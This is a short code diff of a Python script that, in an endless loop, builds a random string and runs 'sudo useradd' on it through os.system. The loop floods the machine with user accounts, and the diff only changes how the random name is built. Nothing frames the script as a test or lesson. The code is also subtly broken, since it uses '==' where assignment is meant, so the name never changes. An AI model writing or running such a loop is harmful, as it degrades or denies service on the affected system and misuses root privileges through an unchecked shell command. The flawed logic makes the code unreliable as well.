@@ -6,5 +6,5 @@ while True:
   i = 0
   while not i == 10:
     i += 1
-    rndstr == rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase) - 1)]
+    rndstr == rndstr + str(random.randint(1, 4783598234658972634895762349872562483655847362))
   os.system("sudo useradd " + rndstr)
